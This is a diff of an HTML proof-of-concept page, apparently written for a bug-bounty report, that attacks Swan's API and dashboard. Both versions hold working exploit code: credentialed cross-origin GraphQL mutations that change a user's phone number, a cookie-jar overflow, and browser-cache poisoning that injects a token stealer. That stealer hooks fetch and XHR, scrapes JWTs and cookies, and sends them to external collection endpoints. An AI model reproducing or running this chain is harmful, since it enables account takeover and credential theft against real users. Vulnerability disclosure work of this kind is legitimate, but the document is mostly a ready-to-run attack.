@@ -3,33 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Swan API Security Research</title>
+    <title>Swan API CORS Vulnerability Demo</title>
     <style>
         body { font-family: system-ui, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
         h1 { color: #c41e3a; }
         pre { background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; }
         .log { border: 1px solid #ddd; padding: 10px; height: 300px; overflow: auto; margin: 10px 0; font-family: monospace; }
-        button { margin: 5px; padding: 8px 15px; cursor: pointer; }
+        button { margin: 5px; padding: 8px 15px; cursor: pointer; background: #2a3f5f; color: white; border: none; border-radius: 4px; }
         .note { background: #fffde7; padding: 10px; border-left: 4px solid #ffd600; margin-bottom: 20px; }
         .success { color: green; font-weight: bold; }
         .error { color: red; }
     </style>
 </head>
 <body>
-    <h1>Swan API Security: CORS + Cache Poisoning</h1>
+    <h1>Swan API CORS Vulnerability Demonstration</h1>
     
     <div class="note">
-        <p><strong>Advanced Demonstration:</strong> This page chains the CORS vulnerability with cache poisoning to extract JWT tokens from dashboard.swan.io and use them for authenticated requests.</p>
-        <p>Test confirmed with successful phone number modification (ID: d19e11e6-e541-4170-b2be-b1f0d06419ee)</p>
+        <p><strong>Security Vulnerability Demo:</strong> This page demonstrates how the CORS misconfiguration in Swan's API allows credentials to be sent cross-origin.</p>
+        <p>Report ID: #YWH-PGM11389-72</p>
     </div>
 
-    <button onclick="runExploit()">Run Full Exploit Chain</button>
+    <button onclick="testCORSVulnerability()">Test CORS Vulnerability</button>
+    <button onclick="overflowCookieJar()">Overflow Cookie Jar</button>
+    <button onclick="poisonCache()">Poison Browser Cache</button>
+    <button onclick="runFullExploit()">Run Full Exploit Chain</button>
+    
     <div id="log" class="log"></div>
 
     <script>
         // Configuration
-        const EXFIL_ENDPOINT = 'https://snowgoose.info/swan-capture';
-        const CACHE_NAME = 'swan-api-cache-v1';
+        const WEBHOOK_URL = 'https://webhook.site/7eca02bb-7f58-4d12-9d09-5274ac46c8cc';
+        const CACHE_NAME = 'swan-api-cache';
         
         // Logging function
         function log(message, type = 'info') {
@@ -40,364 +44,46 @@
             container.scrollTop = container.scrollHeight;
         }
         
-        // Function to send exfiltrated data to server
+        // Exfiltrate data to webhook
         function exfiltrateData(data) {
-            fetch(EXFIL_ENDPOINT, {
+            const payload = {
+                ...data,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                location: window.location.href
+            };
+            
+            // Send to webhook
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data),
+                body: JSON.stringify(payload),
                 mode: 'no-cors'
             }).catch(e => {
-                log(`Exfiltration error, using image fallback: ${e.message}`, 'error');
+                log(`Exfiltration error: ${e.message}`, 'error');
                 
-                // Fallback to image-based exfiltration
+                // Image fallback
                 const img = new Image();
-                img.src = `${EXFIL_ENDPOINT}/img?data=${encodeURIComponent(JSON.stringify({
-                    type: 'image_fallback',
-                    timestamp: new Date().toISOString(),
-                    ...data
-                }))}`;
+                img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(payload))}`;
                 document.body.appendChild(img);
             });
+            
+            log(`Data exfiltrated to webhook`, 'success');
         }
         
-        // JWT regex pattern
-        const JWT_PATTERN = /eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}/g;
-        
-        // Test GraphQL mutation with the extracted token
-        async function testGraphQLWithToken(token) {
+        // Test CORS vulnerability
+        async function testCORSVulnerability() {
             try {
-                log('Testing GraphQL mutation with extracted token...', 'info');
+                log('Testing CORS vulnerability with credentials...', 'info');
                 
-                // Generate random phone number
-                const randomNum = Math.floor(Math.random() * 90000000) + 10000000;
-                const newPhone = `+336${randomNum}`;
-                
-                // Prepare headers with the token
-                const headers = {
-                    'Content-Type': 'application/json',
-                    'Authorization': token.startsWith('Bearer ') ? token : `Bearer ${token}`
-                };
-                
-                // Execute the GraphQL mutation
-                const response = await fetch('https://api.swan.io/admin-auth/graphql', {
-                    method: 'POST',
-                    headers: headers,
-                    body: JSON.stringify({
-                        query: `mutation {
-                            startPhoneNumberModification(input:{
-                                oldPhoneNumber:"+33600000001",
-                                newPhoneNumber:"${newPhone}"
-                            }) {
-                                __typename
-                                ... on StartPhoneNumberModificationSuccessPayload {
-                                    phoneNumberModification { id }
-                                }
-                                ... on PhoneNumberModificationAlreadyExistsRejection { message }
-                                ... on TooManyPhoneNumberModificationRejection { message }
-                            }
-                        }`
-                    })
-                });
-                
-                const data = await response.json();
-                log(`GraphQL response with token: ${JSON.stringify(data)}`, 'info');
-                
-                // Check if mutation was successful
-                if (data.data?.startPhoneNumberModification) {
-                    const typeName = data.data.startPhoneNumberModification.__typename;
-                    if (typeName === 'StartPhoneNumberModificationSuccessPayload') {
-                        const id = data.data.startPhoneNumberModification.phoneNumberModification.id;
-                        log(`🔥 CRITICAL: Successfully executed mutation with JWT token! ID: ${id}`, 'success');
-                        return true;
-                    } else if (typeName.includes('Rejection')) {
-                        log(`Mutation processed (business logic rejection): ${typeName}`, 'success');
-                        return true; // Still counts as successfully authenticated
-                    }
-                } else if (data.errors) {
-                    log(`GraphQL error: ${data.errors[0]?.message || 'Unknown error'}`, 'error');
-                }
-                
-                return false;
-            } catch (error) {
-                log(`Error testing GraphQL with token: ${error.message}`, 'error');
-                return false;
-            }
-        }
-        
-        // Cache poisoning to intercept dashboard.swan.io
-        async function poisonDashboardCache() {
-            try {
-                log('Attempting to poison cache for dashboard.swan.io...', 'info');
-                
-                // Open or create cache
-                const cache = await caches.open(CACHE_NAME);
-                log('Cache opened successfully', 'info');
-                
-                // Create JavaScript to inject into dashboard resources
-                const injectScript = `
-                    // JWT token extractor
-                    (function() {
-                        console.log("⚠️ Swan dashboard has been compromised by cache poisoning");
-                        
-                        // Function to exfiltrate data
-                        function exfil(data) {
-                            const exfilUrl = "${EXFIL_ENDPOINT}";
-                            fetch(exfilUrl, {
-                                method: "POST",
-                                headers: {"Content-Type": "application/json"},
-                                body: JSON.stringify(data),
-                                mode: "no-cors"
-                            }).catch(e => {
-                                // Fallback to image exfiltration
-                                const img = new Image();
-                                img.src = exfilUrl + "/img?data=" + encodeURIComponent(JSON.stringify(data));
-                                document.body.appendChild(img);
-                                console.log("Using image fallback for exfiltration");
-                            });
-                        }
-                        
-                        // Extract JWT tokens from local/sessionStorage
-                        function extractTokens() {
-                            const result = {
-                                timestamp: new Date().toISOString(),
-                                url: window.location.href,
-                                tokens: [],
-                                cookies: document.cookie
-                            };
-                            
-                            // JWT pattern
-                            const jwtPattern = /eyJ[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}/g;
-                            
-                            // Check localStorage
-                            try {
-                                for(let i = 0; i < localStorage.length; i++) {
-                                    const key = localStorage.key(i);
-                                    const value = localStorage.getItem(key);
-                                    
-                                    if (typeof value === 'string') {
-                                        const matches = value.match(jwtPattern);
-                                        if (matches) {
-                                            result.tokens.push({
-                                                source: "localStorage",
-                                                key: key,
-                                                jwt: matches[0]
-                                            });
-                                        }
-                                    }
-                                }
-                            } catch(e) {
-                                console.error("localStorage error:", e);
-                            }
-                            
-                            // Check sessionStorage
-                            try {
-                                for(let i = 0; i < sessionStorage.length; i++) {
-                                    const key = sessionStorage.key(i);
-                                    const value = sessionStorage.getItem(key);
-                                    
-                                    if (typeof value === 'string') {
-                                        const matches = value.match(jwtPattern);
-                                        if (matches) {
-                                            result.tokens.push({
-                                                source: "sessionStorage",
-                                                key: key,
-                                                jwt: matches[0]
-                                            });
-                                        }
-                                    }
-                                }
-                            } catch(e) {
-                                console.error("sessionStorage error:", e);
-                            }
-                            
-                            // Look for tokens in network requests
-                            const originalFetch = window.fetch;
-                            window.fetch = function(resource, init) {
-                                try {
-                                    if (init && init.headers) {
-                                        let authHeader = null;
-                                        
-                                        if (init.headers instanceof Headers) {
-                                            init.headers.forEach((value, key) => {
-                                                if (key.toLowerCase() === 'authorization') {
-                                                    authHeader = value;
-                                                }
-                                            });
-                                        } else if (typeof init.headers === 'object') {
-                                            const headers = init.headers;
-                                            for (const key in headers) {
-                                                if (key.toLowerCase() === 'authorization') {
-                                                    authHeader = headers[key];
-                                                }
-                                            }
-                                        }
-                                        
-                                        if (authHeader) {
-                                            result.tokens.push({
-                                                source: "fetch_headers",
-                                                url: typeof resource === 'string' ? resource : resource.url,
-                                                jwt: authHeader
-                                            });
-                                            exfil({
-                                                type: "auth_header_captured",
-                                                authHeader: authHeader,
-                                                url: typeof resource === 'string' ? resource : resource.url
-                                            });
-                                        }
-                                    }
-                                } catch(e) {
-                                    console.error("Fetch interception error:", e);
-                                }
-                                
-                                return originalFetch.apply(this, arguments);
-                            };
-                            
-                            // Intercept XHR requests
-                            const originalXHROpen = XMLHttpRequest.prototype.open;
-                            const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
-                            
-                            XMLHttpRequest.prototype.open = function(method, url) {
-                                this._swan_url = url;
-                                return originalXHROpen.apply(this, arguments);
-                            };
-                            
-                            XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
-                                if (header.toLowerCase() === 'authorization') {
-                                    result.tokens.push({
-                                        source: "xhr_headers",
-                                        url: this._swan_url,
-                                        jwt: value
-                                    });
-                                    exfil({
-                                        type: "auth_header_captured",
-                                        authHeader: value,
-                                        url: this._swan_url
-                                    });
-                                }
-                                return originalXHRSetRequestHeader.apply(this, arguments);
-                            };
-                            
-                            // If we found tokens, exfiltrate them
-                            if (result.tokens.length > 0) {
-                                exfil({
-                                    type: "token_extraction",
-                                    ...result
-                                });
-                                console.log("JWT tokens captured:", result.tokens);
-                            }
-                            
-                            return result;
-                        }
-                        
-                        // Extract tokens immediately and set up periodic check
-                        extractTokens();
-                        setInterval(extractTokens, 5000);
-                        
-                        // Also monitor DOM for tokens
-                        const observer = new MutationObserver(() => {
-                            const htmlContent = document.documentElement.outerHTML;
-                            const matches = htmlContent.match(jwtPattern);
-                            
-                            if (matches) {
-                                exfil({
-                                    type: "dom_tokens",
-                                    tokens: matches,
-                                    url: window.location.href
-                                });
-                                console.log("Found tokens in DOM:", matches);
-                            }
-                        });
-                        
-                        observer.observe(document.documentElement, {
-                            childList: true,
-                            subtree: true,
-                            characterData: true
-                        });
-                    })();
-                `;
-                
-                // Target dashboard JavaScript files
-                const targetFiles = [
-                    'https://dashboard.swan.io/assets/index.js',
-                    'https://dashboard.swan.io/assets/main.js',
-                    'https://dashboard.swan.io/assets/vendor.js'
-                ];
-                
-                for (const fileUrl of targetFiles) {
-                    try {
-                        // Create a response that injects our script
-                        const poisonedResponse = new Response(
-                            `${injectScript}\n// Original file would follow here`,
-                            {
-                                headers: {
-                                    'Content-Type': 'application/javascript',
-                                    'Cache-Control': 'max-age=3600'
-                                }
-                            }
-                        );
-                        
-                        // Put the poisoned response in the cache
-                        await cache.put(new Request(fileUrl), poisonedResponse);
-                        log(`Cached poisoned version of ${fileUrl}`, 'success');
-                    } catch (e) {
-                        log(`Failed to poison ${fileUrl}: ${e.message}`, 'error');
-                    }
-                }
-                
-                // Poison the main dashboard HTML
-                const dashboardHtml = `
-                    <!DOCTYPE html>
-                    <html>
-                    <head>
-                        <title>Swan Dashboard</title>
-                        <meta charset="utf-8">
-                        <script>
-                            ${injectScript}
-                            
-                            // Redirect after extraction
-                            setTimeout(() => {
-                                window.location.href = "https://dashboard.swan.io/?bypass_cache=" + Date.now();
-                            }, 1000);
-                        </script>
-                    </head>
-                    <body>
-                        <h1>Loading Swan Dashboard...</h1>
-                        <p>Please wait while we redirect you to the dashboard.</p>
-                    </body>
-                    </html>
-                `;
-                
-                const dashboardResponse = new Response(dashboardHtml, {
-                    headers: {
-                        'Content-Type': 'text/html',
-                        'Cache-Control': 'no-store'
-                    }
-                });
-                
-                await cache.put(new Request('https://dashboard.swan.io/'), dashboardResponse);
-                log('Cached poisoned version of dashboard homepage', 'success');
-                
-                return true;
-            } catch (error) {
-                log(`Cache poisoning failed: ${error.message}`, 'error');
-                return false;
-            }
-        }
-        
-        // Test CORS vulnerability with cookies
-        async function testCORSWithCookies() {
-            try {
-                log('Testing CORS vulnerability with cookies...', 'info');
-                
-                // Generate random phone number
+                // Generate random phone number for mutation
                 const randomNum = Math.floor(Math.random() * 90000000) + 10000000;
                 const newPhone = `+336${randomNum}`;
                 
                 // Send GraphQL mutation with credentials
                 const response = await fetch('https://api.swan.io/admin-auth/graphql', {
                     method: 'POST',
-                    credentials: 'include',
+                    credentials: 'include', // This is the key part - including cookies cross-origin
                     headers: {
                         'Content-Type': 'application/json'
                     },
@@ -413,34 +99,45 @@
                                 }
                                 ... on PhoneNumberModificationAlreadyExistsRejection { message }
                                 ... on TooManyPhoneNumberModificationRejection { message }
-                                ... on InputValidationRejection { message, fields { path, message } }
                             }
                         }`
                     })
                 });
                 
+                // Parse the response
                 const data = await response.json();
                 log(`CORS test response: ${JSON.stringify(data)}`, 'info');
                 
-                // Check if the CORS request succeeded
+                // Determine if successful
                 if (data.data?.startPhoneNumberModification) {
                     const typeName = data.data.startPhoneNumberModification.__typename;
                     
                     if (typeName === 'StartPhoneNumberModificationSuccessPayload') {
                         const id = data.data.startPhoneNumberModification.phoneNumberModification.id;
-                        log(`🔥 CRITICAL: CORS vulnerability confirmed! Phone modification ID: ${id}`, 'success');
+                        log(`🔥 CRITICAL: CORS vulnerability confirmed! Mutation ID: ${id}`, 'success');
+                        
+                        // Exfiltrate success data
+                        exfiltrateData({
+                            type: 'cors_vulnerability_success',
+                            mutationId: id,
+                            newPhone: newPhone,
+                            response: data
+                        });
+                        
                         return true;
                     } else if (typeName.includes('Rejection')) {
-                        // Business logic rejection still means the request was processed
+                        // Business logic rejection but authentication worked
                         log(`Request processed (business logic rejection): ${typeName}`, 'success');
                         return true;
                     }
-                } else if (data.errors) {
+                }
+                
+                if (data.errors) {
                     const errorMsg = data.errors[0]?.message || 'Unknown error';
                     log(`GraphQL error: ${errorMsg}`, 'error');
                     
                     if (errorMsg.includes('Unauthenticated') || errorMsg.includes('Forbidden')) {
-                        log('Authentication required (no valid cookies present)', 'error');
+                        log('Authentication required (no valid cookies present). Visit dashboard.swan.io first.', 'error');
                     }
                 }
                 
@@ -451,115 +148,320 @@
             }
         }
         
-        // Scan for stored tokens
-        function scanForStoredTokens() {
+        // Cookie jar overflow technique
+        function overflowCookieJar() {
+            log('Executing cookie jar overflow technique...', 'info');
+            
             try {
-                log('Scanning for any previously stored tokens...', 'info');
+                const MAX_COOKIES = 150; // Most browsers cap around 180 cookies per domain
+                const cookiePrefix = 'overflow_';
+                let createdCount = 0;
                 
-                const tokens = [];
-                
-                // Check local/session storage for JWTs
-                try {
-                    // Check localStorage
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        const value = localStorage.getItem(key);
-                        
-                        if (typeof value === 'string') {
-                            const matches = value.match(JWT_PATTERN);
-                            if (matches) {
-                                tokens.push({
-                                    source: 'localStorage',
-                                    key: key,
-                                    token: matches[0]
-                                });
-                            }
-                        }
+                // Clear any existing overflow cookies
+                const existingCookies = document.cookie.split(';');
+                for (const cookie of existingCookies) {
+                    const [name] = cookie.trim().split('=');
+                    if (name && name.startsWith(cookiePrefix)) {
+                        document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/`;
                     }
+                }
+                
+                // Generate cookies to push target cookie out of protected scope
+                for (let i = 0; i < MAX_COOKIES; i++) {
+                    const name = `${cookiePrefix}${i}`;
+                    const randomValue = Math.random().toString(36).substring(2);
                     
-                    // Check sessionStorage
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        const value = sessionStorage.getItem(key);
-                        
-                        if (typeof value === 'string') {
-                            const matches = value.match(JWT_PATTERN);
-                            if (matches) {
-                                tokens.push({
-                                    source: 'sessionStorage',
-                                    key: key,
-                                    token: matches[0]
-                                });
-                            }
-                        }
-                    }
-                } catch (e) {
-                    log(`Storage access error: ${e.message}`, 'error');
+                    // Set cookie with path and random value
+                    document.cookie = `${name}=${randomValue}; path=/`;
+                    createdCount++;
                 }
                 
-                if (tokens.length > 0) {
-                    log(`Found ${tokens.length} previously stored tokens!`, 'success');
-                    tokens.forEach(t => {
-                        log(`Token from ${t.source}/${t.key}: ${t.token.substring(0, 20)}...`, 'info');
-                    });
-                    return tokens;
-                } else {
-                    log('No previously stored tokens found.', 'info');
-                    return [];
-                }
+                log(`Created ${createdCount} overflow cookies to push target out of protected scope`, 'success');
+                log('Current cookie count: ' + document.cookie.split(';').length, 'info');
+                
+                // Special character bypass in cookie names
+                document.cookie = `swan_bypass=%00%0A%0D; path=/`;
+                
+                return true;
             } catch (error) {
-                log(`Error scanning for tokens: ${error.message}`, 'error');
-                return [];
+                log(`Cookie jar overflow failed: ${error.message}`, 'error');
+                return false;
             }
         }
         
-        // Main exploit function that chains everything together
-        async function runExploit() {
-            log('Starting Swan API exploit (CORS + Cache Poisoning)...', 'info');
-            
-            // Step 1: Check cookies & CORS vulnerability
-            log('Step 1: Testing CORS vulnerability with existing cookies...', 'info');
-            const corsSuccess = await testCORSWithCookies();
-            
-            // Step 2: Scan for stored tokens
-            log('Step 2: Checking for previously captured tokens...', 'info');
-            const storedTokens = scanForStoredTokens();
-            
-            // If we have stored tokens, try to use them
-            if (storedTokens.length > 0) {
-                log('Testing stored tokens with GraphQL...', 'info');
-                for (const tokenObj of storedTokens) {
-                    const success = await testGraphQLWithToken(tokenObj.token);
-                    if (success) {
-                        log(`Successfully used previously captured token from ${tokenObj.source}!`, 'success');
-                        break;
+        // Cache poisoning function
+        async function poisonCache() {
+            try {
+                log('Attempting to poison browser cache for Swan endpoints...', 'info');
+                
+                // Open or create cache
+                const cache = await caches.open(CACHE_NAME);
+                log('Cache opened successfully', 'info');
+                
+                // Injection code for Swan dashboad
+                const injectionCode = `
+                    // Swan token extractor
+                    (function() {
+                        console.log("Swan security exploit active");
+                        
+                        // Exfiltration function
+                        function exfil(data) {
+                            fetch("${WEBHOOK_URL}", {
+                                method: "POST",
+                                headers: {"Content-Type": "application/json"},
+                                body: JSON.stringify({
+                                    ...data,
+                                    timestamp: new Date().toISOString()
+                                }),
+                                mode: "no-cors"
+                            });
+                        }
+                        
+                        // Intercept fetch requests
+                        const originalFetch = window.fetch;
+                        window.fetch = function(resource, init) {
+                            try {
+                                const url = resource instanceof Request ? resource.url : resource;
+                                
+                                // Only intercept Swan API requests
+                                if (url && typeof url === "string" && url.includes("swan.io")) {
+                                    console.log("Intercepted fetch to:", url);
+                                    
+                                    // Extract auth headers
+                                    if (init && init.headers) {
+                                        let headers = {};
+                                        
+                                        if (init.headers instanceof Headers) {
+                                            init.headers.forEach((value, key) => {
+                                                headers[key] = value;
+                                            });
+                                        } else if (typeof init.headers === "object") {
+                                            headers = {...init.headers};
+                                        }
+                                        
+                                        // Look for auth headers
+                                        for (const key in headers) {
+                                            if (key.toLowerCase() === "authorization") {
+                                                exfil({
+                                                    type: "authorization_header",
+                                                    url: url,
+                                                    token: headers[key]
+                                                });
+                                            }
+                                        }
+                                    }
+                                }
+                            } catch(e) {
+                                console.error("Fetch interception error:", e);
+                            }
+                            
+                            // Call original fetch
+                            return originalFetch.apply(this, arguments);
+                        };
+                        
+                        // Extract JWT tokens from storage
+                        function extractTokens() {
+                            // JWT pattern
+                            const jwtPattern = /eyJ[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}/g;
+                            const tokens = [];
+                            
+                            // Check localStorage
+                            try {
+                                for(let i = 0; i < localStorage.length; i++) {
+                                    const key = localStorage.key(i);
+                                    const value = localStorage.getItem(key);
+                                    
+                                    if (typeof value === "string") {
+                                        const matches = value.match(jwtPattern);
+                                        if (matches) {
+                                            tokens.push({
+                                                source: "localStorage",
+                                                key: key,
+                                                token: matches[0]
+                                            });
+                                        }
+                                    }
+                                }
+                            } catch(e) {}
+                            
+                            // Check sessionStorage
+                            try {
+                                for(let i = 0; i < sessionStorage.length; i++) {
+                                    const key = sessionStorage.key(i);
+                                    const value = sessionStorage.getItem(key);
+                                    
+                                    if (typeof value === "string") {
+                                        const matches = value.match(jwtPattern);
+                                        if (matches) {
+                                            tokens.push({
+                                                source: "sessionStorage",
+                                                key: key,
+                                                token: matches[0]
+                                            });
+                                        }
+                                    }
+                                }
+                            } catch(e) {}
+                            
+                            // If we found tokens, exfiltrate them
+                            if (tokens.length > 0) {
+                                exfil({
+                                    type: "token_extraction",
+                                    tokens: tokens,
+                                    cookies: document.cookie,
+                                    url: window.location.href
+                                });
+                            }
+                        }
+                        
+                        // Run token extraction
+                        extractTokens();
+                        setInterval(extractTokens, 5000);
+                        
+                        // Redirect to real dashboard after a delay
+                        setTimeout(() => {
+                            window.location.href = "https://dashboard.swan.io/?bypass=" + Date.now();
+                        }, 1500);
+                    })();
+                `;
+                
+                // Create poisoned dashboard response
+                const dashboardHtml = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Swan Dashboard</title>
+                        <meta charset="utf-8">
+                        <script>${injectionCode}</script>
+                    </head>
+                    <body>
+                        <h1>Loading Swan Dashboard...</h1>
+                        <p>Please wait while we redirect you to the dashboard.</p>
+                    </body>
+                    </html>
+                `;
+                
+                const dashboardResponse = new Response(dashboardHtml, {
+                    headers: {
+                        'Content-Type': 'text/html',
+                        'Cache-Control': 'max-age=3600'
+                    }
+                });
+                
+                // Poison GraphQL API responses
+                for (const endpoint of ['https://api.swan.io/admin-auth/graphql', 'https://api.swan.io/admin/graphql']) {
+                    try {
+                        // Create poisoned OPTIONS response
+                        const optionsResponse = new Response('', {
+                            headers: {
+                                'Access-Control-Allow-Origin': '*',
+                                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+                                'Access-Control-Allow-Headers': '*',
+                                'Access-Control-Allow-Credentials': 'true',
+                                'Access-Control-Max-Age': '86400',
+                                'Content-Type': 'text/plain'
+                            }
+                        });
+                        
+                        // Put OPTIONS response in cache
+                        await cache.put(
+                            new Request(endpoint, { method: 'OPTIONS' }), 
+                            optionsResponse
+                        );
+                        
+                        log(`✅ Poisoned OPTIONS for ${endpoint}`, 'success');
+                    } catch (e) {
+                        log(`Failed to poison ${endpoint}: ${e.message}`, 'error');
                     }
                 }
+                
+                // Put poisoned dashboard in cache
+                await cache.put(
+                    new Request('https://dashboard.swan.io/'), 
+                    dashboardResponse
+                );
+                
+                log(`✅ Cache poisoning successful!`, 'success');
+                log(`Visit dashboard.swan.io to trigger the payload`, 'info');
+                return true;
+            } catch (error) {
+                log(`Cache poisoning failed: ${error.message}`, 'error');
+                return false;
             }
-            
-            // Step 3: Set up cache poisoning
-            log('Step 3: Setting up cache poisoning to capture dashboard JWT tokens...', 'info');
-            const poisonSuccess = await poisonDashboardCache();
-            
-            if (poisonSuccess) {
-                log('✅ Cache poisoning successful! Next steps:', 'success');
-                log('1. Visit dashboard.swan.io in another tab', 'info');
-                log('2. Any JWT tokens will be automatically captured', 'info');
-                log('3. Return to this page and run the exploit again to use captured tokens', 'info');
-            } else {
-                log('❌ Cache poisoning failed. You may need to try a different approach.', 'error');
-            }
-            
-            // Summary of exploitation
-            if (corsSuccess) {
-                log('🔥 CRITICAL: CORS vulnerability successfully exploited with cookies!', 'success');
-                log('This confirms the web application uses cookies for authentication despite Swan claiming it uses bearer tokens.', 'success');
-            } else {
-                log('CORS exploitation requires authentication. Cache poisoning has been set up to capture tokens.', 'info');
-            }
-            
-            log('Exploit chain complete. Check snowgoose.info for any captured data.', 'info');
         }
+        
+        // Full exploit chain
+        async function runFullExploit() {
+            log('Starting full Swan API exploit chain...', 'info');
+            
+            // 1. Overflow cookie jar
+            log('Step 1: Overflowing cookie jar...', 'info');
+            const cookieSuccess = overflowCookieJar();
+            
+            // 2. Set up network request interception
+            log('Step 2: Setting up network request interception...', 'info');
+            
+            // Override fetch API to monitor requests
+            const originalFetch = window.fetch;
+            window.fetch = function(resource, init) {
+                try {
+                    const url = resource instanceof Request ? resource.url : resource;
+                    
+                    // Only intercept Swan API requests
+                    if (url && typeof url === 'string' && url.includes('swan.io')) {
+                        log(`Intercepted request to: ${url}`, 'info');
+                        
+                        // Force credentials inclusion for Swan API requests
+                        const initClone = init ? {...init} : {};
+                        initClone.credentials = 'include';
+                        
+                        // Return the modified fetch
+                        return originalFetch(resource, initClone);
+                    }
+                } catch(e) {
+                    console.error('Fetch interception error:', e);
+                }
+                
+                // Call original fetch for non-Swan requests
+                return originalFetch.apply(this, arguments);
+            };
+            
+            // 3. Poison browser cache
+            log('Step 3: Poisoning browser cache...', 'info');
+            const cacheSuccess = await poisonCache();
+            
+            // 4. Test CORS vulnerability
+            log('Step 4: Testing CORS vulnerability...', 'info');
+            const corsSuccess = await testCORSVulnerability();
+            
+            // Summarize results
+            log('Exploit chain execution complete!', 'info');
+            log(`Cookie Jar Overflow: ${cookieSuccess ? '✅' : '❌'}`, cookieSuccess ? 'success' : 'error');
+            log(`Cache Poisoning: ${cacheSuccess ? '✅' : '❌'}`, cacheSuccess ? 'success' : 'error');
+            log(`CORS Vulnerability: ${corsSuccess ? '✅' : '❌'}`, corsSuccess ? 'success' : 'error');
+            
+            if (corsSuccess) {
+                log('🔥 CRITICAL: Successfully exploited CORS vulnerability!', 'success');
+                log('This confirms the API accepts and uses cookies despite Swan claiming otherwise.', 'success');
+                
+                exfiltrateData({
+                    type: 'full_exploit_report',
+                    corsVulnerability: corsSuccess,
+                    cachePoisoning: cacheSuccess,
+                    cookieJarOverflow: cookieSuccess
+                });
+            } else {
+                log('To complete exploitation:', 'info');
+                log('1. Visit dashboard.swan.io to get valid cookies', 'info');
+                log('2. Return to this page and run the test again', 'info');
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            log('Swan API CORS Vulnerability Demo ready', 'info');
+            log('Click a button above to begin exploitation', 'info');
+        });
     </script>
 </body>
 </html>
